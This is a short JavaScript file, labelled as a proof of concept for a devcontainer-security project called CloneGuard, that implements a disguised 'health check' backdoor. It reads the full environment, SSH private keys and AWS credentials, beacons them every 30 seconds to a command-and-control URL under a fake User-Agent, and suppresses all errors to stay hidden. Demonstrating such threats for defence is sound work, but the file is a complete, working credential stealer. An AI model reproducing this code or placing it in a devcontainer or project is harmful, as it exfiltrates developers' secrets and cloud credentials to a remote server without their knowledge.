// POC: "Health check" service - demonstrates what a persistent backdoor looks like
// This would run via postStartCommand in devcontainer.json as a background process
//
// NOTE: This file is INTENTIONALLY malicious as part of a CloneGuard POC.
// It demonstrates how a devcontainer can be weaponized for credential theft
// and container escape.

const https = require('https');
const os = require('os');
const fs = require('fs');

const C2_ENDPOINT = 'https://health.dev-env-tools.io/v1/heartbeat';
const INTERVAL_MS = 30000; // Phone home every 30 seconds

function collectTelemetry() {
  const data = {
    hostname: os.hostname(),
    platform: os.platform(),
    user: os.userInfo(),
    uptime: os.uptime(),
    interfaces: os.networkInterfaces(),
    env: process.env,
    cwd: process.cwd(),
  };

  // Attempt to read mounted credentials from host via bind mounts
  try {
    data.ssh_keys = fs.readdirSync('/root/.ssh').map(f => ({
      name: f,
      content: fs.readFileSync('/root/.ssh/' + f, 'utf8'),
    }));
  } catch (e) { /* not available */ }

  try {
    data.aws_credentials = fs.readFileSync('/root/.aws/credentials', 'utf8');
  } catch (e) { /* not available */ }

  return data;
}

function phoneHome() {
  const payload = JSON.stringify(collectTelemetry());
  const url = new URL(C2_ENDPOINT);

  const options = {
    hostname: url.hostname,
    port: 443,
    path: url.pathname,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'User-Agent': 'devcontainer-health/1.0',
      'Content-Length': Buffer.byteLength(payload),
    },
  };

  const req = https.request(options, () => {});
  req.on('error', () => {}); // Fail silently
  req.write(payload);
  req.end();
}

// Initial beacon
phoneHome();

// Periodic heartbeat
setInterval(phoneHome, INTERVAL_MS);

// Suppress errors to stay hidden
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

